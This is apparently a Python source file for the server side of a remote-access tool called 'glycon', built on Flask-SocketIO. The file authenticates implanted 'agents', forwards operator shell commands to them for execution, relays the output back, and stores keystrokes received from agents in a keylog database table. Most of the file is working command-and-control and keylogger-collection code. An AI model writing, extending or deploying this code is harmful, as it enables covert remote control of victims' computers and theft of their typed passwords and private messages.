from flask_login import current_user
from flask_socketio import SocketIO, join_room, leave_room, emit
from glycon.config import CONFIG
import sqlite3
from datetime import datetime
import json
import os
from glycon.secure_comms import SecureComms

def init_socket_handlers(socketio):
    active_agents = {}  
    connection_count = 0

    @socketio.on('connect', namespace='/terminal')
    def handle_terminal_connect():
        nonlocal connection_count
        connection_count += 1
        print(f"[SocketIO] Terminal client connected. Total connections: {connection_count}")
        if current_user.is_authenticated:
            print(f"[SocketIO] Authenticated user: {current_user.id}")

    @socketio.on('join_terminal', namespace='/terminal')
    def handle_join_terminal(data):
        if current_user.is_authenticated:
            join_room(f"terminal_{data['agent_id']}")
            print(f"[SocketIO] Terminal UI joined room for agent {data['agent_id']}")

    @socketio.on('disconnect', namespace='/terminal')
    def handle_terminal_disconnect():
        nonlocal connection_count
        connection_count -= 1
        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")

    @socketio.on('agent_connect', namespace='/terminal')
    def handle_agent_connect(data):
        nonlocal connection_count
        try:
            print(f"[SocketIO] Agent connection attempt: {data['agent_id']}")
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                print("[SocketIO] Authentication failed: Invalid token")
                return False
            
            join_room(f"agent_{data['agent_id']}", namespace='/terminal')
            active_agents[data['agent_id']] = True
            connection_count += 1
            print(f"[SocketIO] Agent authenticated. Total connections: {connection_count}")
            
            # Update database
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("UPDATE agents SET ws_connected=1 WHERE id=?", (data['agent_id'],))
            conn.commit()
            conn.close()
            
            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"agent_{data['agent_id']}", namespace='/terminal')
            
            emit('status', {
                'status': 'connected',
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            print(f"[SocketIO] Agent {data['agent_id']} fully connected")
            return True
        except Exception as e:
            print(f"[SocketIO] Agent connection error: {str(e)}")
            emit('status', {
                'status': 'error',
                'message': str(e),
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            return False
        

    @socketio.on('command', namespace='/terminal')
    def handle_command(data):
        print(f"[SocketIO] Received command for agent {data['agent_id']}: {data['command']}")
        if not current_user.is_authenticated:
            print("[SocketIO] Command rejected: Unauthenticated")
            return
            
        agent_id = data.get('agent_id')
        command = data.get('command')
        current_dir = data.get('current_dir', '')
        
        if not agent_id or not command:
            print("[SocketIO] Command rejected: Missing parameters")
            return
            
        if agent_id in active_agents:
            print(f"[SocketIO] Forwarding command to agent {agent_id}")
            emit('execute_command', {
                'command': command,
                'current_dir': current_dir
            }, room=f"agent_{agent_id}", namespace='/terminal')
        else:
            error_msg = 'Agent not connected via WebSocket'
            print(f"[SocketIO] {error_msg}")
            emit('terminal_output', {
                'agent_id': agent_id,
                'error': error_msg,
                'current_dir': current_dir
            }, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('command_result', namespace='/terminal')
    def handle_command_result(data):
        try:
            print(f"[SocketIO] Command result from agent {data['agent_id']}:")
            print(f"Command: {data.get('command')}")
            print(f"Output: {data.get('output')}")
            print(f"Error: {data.get('error')}")
            
            # Broadcast to the terminal UI
            emit('terminal_output', {
                'agent_id': data['agent_id'],
                'command': data.get('command'),
                'output': data.get('output'),
                'error': data.get('error'),
                'current_dir': data.get('current_dir')
            }, room=f"terminal_{data['agent_id']}")
            
        except Exception as e:
            print(f"[SocketIO] Error handling command result: {str(e)}")

    @socketio.on('ws_control', namespace='/terminal')
    def handle_ws_control(data):
        if not current_user.is_authenticated:
            return
            
        agent_id = data.get('agent_id')
        action = data.get('action')
        
        if not agent_id or action not in ['start', 'stop']:
            return
            
        if action == 'start':
            emit('ws_status', {
                'agent_id': agent_id,
                'action': action,
                'status': 'pending'
            }, room=f"terminal_{agent_id}", namespace='/terminal')
        else:
            if agent_id in active_agents:
                emit('disconnect', {}, room=f"agent_{agent_id}", namespace='/terminal')
                active_agents.pop(agent_id, None)
                
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()
                
                emit('ws_status', {
                    'agent_id': agent_id,
                    'action': action,
                    'status': 'success',
                    'message': 'WebSocket disconnected'
                }, room=f"terminal_{agent_id}", namespace='/terminal')
                
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('disconnect', namespace='/terminal')
    def handle_agent_disconnect():
        for agent_id in list(active_agents.keys()):
            if f"agent_{agent_id}" in socketio.server.manager.rooms['/terminal']:
                active_agents.pop(agent_id, None)
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()
                
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"terminal_{agent_id}", namespace='/terminal')
                
                emit('ws_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'WebSocket disconnected'
                }, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('keylogger_data', namespace='/terminal')
    def handle_keylogger_data(data):
        if not current_user.is_authenticated:
            return
        agent_id = data.get('agent_id')
        keys = data.get('keys')
        timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        if not agent_id or not keys:
            return
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("INSERT INTO keylogs (agent_id, keys, timestamp) VALUES (?, ?, ?)", (agent_id, keys, timestamp))
            conn.commit()
            conn.close()
            emit('keylogger_ack', {'status': 'success'}, room=f"agent_{agent_id}", namespace='/terminal')
        except Exception as e:
            print(f"[SocketIO] Error saving keylogger data: {str(e)}")
            emit('keylogger_ack', {'status': 'error', 'message': str(e)}, room=f"agent_{agent_id}", namespace='/terminal')
